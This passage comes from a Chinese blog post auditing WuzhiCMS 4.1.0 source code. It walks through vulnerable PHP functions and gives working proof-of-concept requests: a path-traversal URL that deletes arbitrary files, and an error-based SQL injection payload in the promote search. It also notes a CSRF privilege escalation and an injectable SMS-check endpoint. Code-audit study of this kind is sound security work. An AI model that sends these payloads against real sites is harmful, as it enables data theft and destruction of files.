class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$filePath</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>)) &#123;<br>            <span class="hljs-variable">$filePath</span>= <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filePath</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)==<span class="hljs-string">&#x27;coreframe&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = COREFRAME_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">9</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)==<span class="hljs-string">&#x27;www&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = WWW_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">3</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="搜关键字"><a href="#搜关键字" class="headerlink" title="搜关键字"></a>搜关键字</h1><h2 id="文件安全："><a href="#文件安全：" class="headerlink" title="文件安全："></a>文件安全：</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>搜索del() -&gt; coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php -&gt; del()</p><p>有可控变量 $url </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//从全局变量 $GLOBALS 中获取 id 和 url</span><br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//remove_xss() 函数用来清理 url 变量，防止 XSS 攻击</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//判断是否都为空</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<span class="hljs-comment">//按 id 删除</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<span class="hljs-comment">//将 id 转化为数组</span><br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<span class="hljs-comment">//从 attachment 表中查找该 id的记录并取usertimes 和 path</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//若引用数大于 1，只减少使用次数，不删除物理文件</span><br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则，彻底删除</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//按url 删除，如果没有 URL，报错返回。</span><br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//将 URL 中的 ATTACHMENT_URL 去掉，得到文件相对路径 path</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<span class="hljs-comment">//根据 path 查找数据库记录</span><br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<span class="hljs-comment">//如果没有记录，只删物理文件</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//引用多次，只减引用次数</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进my_unlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_unlink</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<span class="hljs-comment">//文件存在直接删除</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>index.php?m&#x3D;attachment&amp;f&#x3D;index&amp;v&#x3D;del&amp;_su&#x3D;wuzhicms&amp;url&#x3D;..&#x2F;..&#x2F;1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png" alt="20250717140708632"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>搜索select</p><p>发现这里的很多参数都是原样拼接，可能存在风险</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//  coreframe/app/core/libs/class/mysqli.class.php</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_list</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$keyfield</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$keyfield</span>) &#123;<br><span class="hljs-variable">$arr</span>[<span class="hljs-variable">$data</span>[<span class="hljs-variable">$keyfield</span>]] = <span class="hljs-variable">$data</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$arr</span>[] = <span class="hljs-variable">$data</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进get_list函数，最后只找到这里有可控变量 $fieldtype、$keywords</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// coreframe/app/promote/admin/index.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>        <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>        &#125;<br><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>$fieldtype、$keywords俩个参数拼接到$where中，</p><p>构造poc:</p><p><code>index.php?m=promote&amp;f=index&amp;_su=wuzhicms&amp;v=search&amp;fieldtype=place&amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png" alt="20250717143106637"></p><h1 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$GLOBALS = <span class="hljs-built_in">array</span>();<span class="hljs-comment">//清除所有的全局变量</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">microtime函数返回当前 Unix 时间戳的微秒数。<br></code></pre></td></tr></table></figure><p>magic_quotes_runtime 的作用</p><p><a href="http://blog.csdn.net/tom_green/article/details/7039002">http://blog.csdn.net/tom_green/article/details/7039002</a></p><p>magic_quotes_gpc函数详解 </p><p><a href="https://www.cnblogs.com/timelesszhuang/p/3726736.html">https://www.cnblogs.com/timelesszhuang/p/3726736.html</a></p><h1 id="漏洞补充："><a href="#漏洞补充：" class="headerlink" title="漏洞补充："></a>漏洞补充：</h1><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>五指CMS 4.1.0版本存在一个CSRF漏洞，当管理员登陆后访问下面CSRF测试页面可将普通用户提成为管理员权限。</p><h2 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h2><p>多个变量未使用引号包裹的SQL语句,只要是调用<code>get_one</code>这个函数的地方都存在SQL注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_one</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$condition</span> = <span class="hljs-literal">TRUE</span></span>) </span>&#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$condition</span>) &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">escape_string</span>(<span class="hljs-variable">$field</span>);<br>&#125;<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php,找到可控变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;WWW_ROOT&#x27;</span>,<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>), <span class="hljs-number">0</span>, -<span class="hljs-number">4</span>).<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;../configs/web_config.php&#x27;</span>;<br><span class="hljs-keyword">require</span> COREFRAME_ROOT.<span class="hljs-string">&#x27;core.php&#x27;</span>;<br><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>])) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]==<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;param&#x27;</span>]);<br><span class="hljs-variable">$posttime</span> = SYS_TIME-<span class="hljs-number">300</span>;<span class="hljs-comment">//5分钟内有效</span><br><span class="hljs-variable">$db</span> = <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;db&#x27;</span>);<br><span class="hljs-variable">$r</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;sms_checkcode&#x27;</span>,<span class="hljs-string">&quot;`code`=&#x27;<span class="hljs-subst">$code</span>&#x27; AND `posttime`&gt;<span class="hljs-subst">$posttime</span>&quot;</span>,<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$r</span>) &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证通过&quot;,&quot;status&quot;:&quot;y&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span 